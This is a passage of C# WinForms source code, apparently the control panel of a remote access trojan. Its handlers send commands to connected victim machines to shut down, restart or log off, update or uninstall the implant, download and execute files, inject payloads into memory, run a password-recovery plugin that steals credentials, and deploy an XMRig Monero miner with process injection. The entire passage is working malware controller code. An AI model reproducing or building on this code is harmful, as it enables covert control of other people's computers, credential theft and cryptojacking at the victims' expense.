                            {
                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
        private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "close";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void RestartToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "restart";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void UpdateToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "sendFile";
                        packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                        packet.ForcePathObject("Update").AsString = "true";

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (Clients client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you want to unistall", "Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.Yes)
            {
                try
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "uninstall";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        private void ShowFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                Clients[] clients = GetSelectedClients();
                if (clients.Length == 0)
                {
                    Process.Start(Application.StartupPath);
                    return;
                }

                foreach (Clients client in clients)
                {
                    string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID);
                    if (Directory.Exists(fullPath))
                    {
                        Process.Start(fullPath);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void RestartToolStripMenuItem3_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "restart";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ShutdownToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "shutdown";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void LogoffToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "pcOptions";
                packet.ForcePathObject("Option").AsString = "logoff";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormBuilder formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }


        private void ABOUTToolStripMenuItem_Click(object sender, EventArgs e)
        {
/*            using (FormAbout formAbout = new FormAbout())
            {
                formAbout.ShowDialog();
            }*/
        }

        private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                lock (Settings.LockListviewLogs)
                {
                    listView2.Items.Clear();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void STARTToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "thumbnails";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Options.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
            }
        }

        private void STOPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView1.Items.Count > 0)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "thumbnailsStop";

                    foreach (ListViewItem itm in listView3.Items)
                    {
                        Clients client = (Clients)itm.Tag;
                        ThreadPool.QueueUserWorkItem(client.Send, packet.Encode2Bytes());
                    }
                }
                listView3.Items.Clear();
                ThumbnailImageList.Images.Clear();
                foreach (ListViewItem itm in listView1.Items)
                {
                    Clients client = (Clients)itm.Tag;
                    client.LV2 = null;
                }
            }
            catch { }
        }


        private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0)
            {
                foreach (ListViewItem item in listView4.SelectedItems)
                {
                    item.Remove();
                }
            }
        }

        private async void TimerTask_Tick(object sender, EventArgs e)
        {
            try
            {
                Clients[] clients = GetAllClients();
                if (getTasks.Count > 0 && clients.Length > 0)
                    foreach (AsyncTask asyncTask in getTasks.ToList())
                    {
                        if (GetListview(asyncTask.id) == false)
                        {
                            getTasks.Remove(asyncTask);
                            Debug.WriteLine("task removed");
                            return;
                        }

                        foreach (Clients client in clients)
                        {
                            if (!asyncTask.doneClient.Contains(client.ID))
                            {
                                Debug.WriteLine("task executed");
                                asyncTask.doneClient.Add(client.ID);
                                SetExecution(asyncTask.id);
                                ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                            }
                        }
                        await Task.Delay(15 * 1000); //15sec per 1 task
                    }
            }
            catch { }
        }

        private void MinerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView4.Items.Count > 0)
                {
                    foreach (ListViewItem item in listView4.Items)
                    {
                        if (item.Text == "Miner XMR")
                        {
                            return;
                        }
                    }
                }

                using (FormMiner form = new FormMiner())
                {
                    if (form.ShowDialog() == DialogResult.OK)
                    {
                        if (!File.Exists(@"Plugins\xmrig.bin"))
                        {
                            File.WriteAllBytes(@"Plugins\xmrig.bin", Properties.Resources.xmrig);
                        }
                        MsgPack packet = new MsgPack();
                        packet.ForcePathObject("Packet").AsString = "xmr";
                        packet.ForcePathObject("Command").AsString = "run";
                        XmrSettings.Pool = form.txtPool.Text;
                        packet.ForcePathObject("Pool").AsString = form.txtPool.Text;

                        XmrSettings.Wallet = form.txtWallet.Text;
                        packet.ForcePathObject("Wallet").AsString = form.txtWallet.Text;

                        XmrSettings.Pass = form.txtPass.Text;
                        packet.ForcePathObject("Pass").AsString = form.txtPool.Text;

                        XmrSettings.InjectTo = form.comboInjection.Text;
                        packet.ForcePathObject("InjectTo").AsString = form.comboInjection.Text;

                        XmrSettings.Hash = GetHash.GetChecksum(@"Plugins\xmrig.bin");
                        packet.ForcePathObject("Hash").AsString = XmrSettings.Hash;

                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "plugin";
                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        ListViewItem lv = new ListViewItem();
                        lv.Text = "Miner XMR";
                        lv.SubItems.Add("0");
                        lv.ToolTipText = Guid.NewGuid().ToString();
                        listView4.Items.Add(lv);
                        listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                        getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void PASSWORDRECOVERYToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (listView4.Items.Count > 0)
                {
                    foreach (ListViewItem item in listView4.Items)
                    {
                        if (item.Text == "Recovery Password")
                        {
                            return;
                        }
                    }
                }

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Recovery.dll"));

                ListViewItem lv = new ListViewItem();
                lv.Text = "Recovery Password";
                lv.SubItems.Add("0");
                lv.ToolTipText = Guid.NewGuid().ToString();
                listView4.Items.Add(lv);
                listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendFile";
                    packet.ForcePathObject("Update").AsString = "false";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    ListViewItem lv = new ListViewItem();
                    lv.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                    {
                        foreach (ListViewItem item in listView4.Items)
                        {
                            if (item.Text == lv.Text)
                            {
                                return;
                            }
                        }
                    }

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                FormSendFileToMemory formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.toolStripStatusLabel1.Text.Length > 0 && formSend.toolStripStatusLabel1.ForeColor == Color.Green)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendMemory";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));

                    if (formSend.comboBox1.SelectedIndex == 0)
                    {
                        packet.ForcePathObject("Inject").AsString = "";
                    }
                    else
                    {
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                    }

                    ListViewItem lv = new ListViewItem();
                    lv.Text = "SendMemory: " + Path.GetFileName(formSend.toolStripStatusLabel1.Tag.ToString());
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    if (listView4.Items.Count > 0)
                    {
                        foreach (ListViewItem item in listView4.Items)
                        {
                            if (item.Text == lv.Text)
                            {
                                return;
                            }
                        }
                    }

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                }
                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Packet").AsString = "sendFile";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));

                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                    packet.ForcePathObject("Update").AsString = "true";

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\SendFile.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    ListViewItem lv = new ListViewItem();
                    lv.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                    {
                        foreach (ListViewItem item in listView4.Items)
                        {
                            if (item.Text == lv.Text)
                            {
                                return;
                            }
                        }
                    }

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private bool GetListview(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
            {
                if (item.ToolTipText == id)
                {
                    return true;
                }
            }
            return false;
        }

        private void SetExecution(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
            {
                if (item.ToolTipText == id)
                {
                    int count = Convert.ToInt32(item.SubItems[1].Text);
                    count++;
                    item.SubItems[1].Text = count.ToString();
                }
            }
        }


        private void BlockClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (FormBlockClients form = new FormBlockClients())
            {
                form.ShowDialog();
            }
        }



        [DllImport("uxtheme", CharSet = CharSet.Unicode)]
        public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

        private void tabControl1_DrawItem(object sender, DrawItemEventArgs e)
        {
            Rectangle rec = tabControl1.ClientRectangle;
            StringFormat StrFormat = new StringFormat();
            StrFormat.LineAlignment = StringAlignment.Center;
            StrFormat.Alignment = StringAlignment.Center;

            SolidBrush backColor = new SolidBrush(Color.Black);
            SolidBrush fontColor;

            e.Graphics.FillRectangle(backColor, rec);

            Font fntTab = e.Font;
            Brush bshBack = new SolidBrush(Color.DimGray);

            for (int i = 0; i < tabControl1.TabPages.Count; i++)
            {
                bool bSelected = (tabControl1.SelectedIndex == i);
                Rectangle recBounds = tabControl1.GetTabRect(i);
                RectangleF tabTextArea = (RectangleF)tabControl1.GetTabRect(i);
                if (bSelected)
                {
                    e.Graphics.FillRectangle(bshBack, recBounds);
                    fontColor = new SolidBrush(Color.White);
                    e.Graphics.DrawString(tabControl1.TabPages[i].Text, fntTab, fontColor, tabTextArea, StrFormat);
                }
                else
                {
                    fontColor = new SolidBrush(Color.White);
                    e.Graphics.DrawString(tabControl1.TabPages[i].Text, fntTab, fontColor, tabTextArea, StrFormat);
                }
            }
        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {

        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
        }

        private void listView2_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
                // Sütun başlıklarının arka plan rengini mavi olarak ayarlar
/*                e.Graphics.FillRectangle(Brushes.Blue, e.Bounds);
                e.DrawText();*/
        }
    }
}
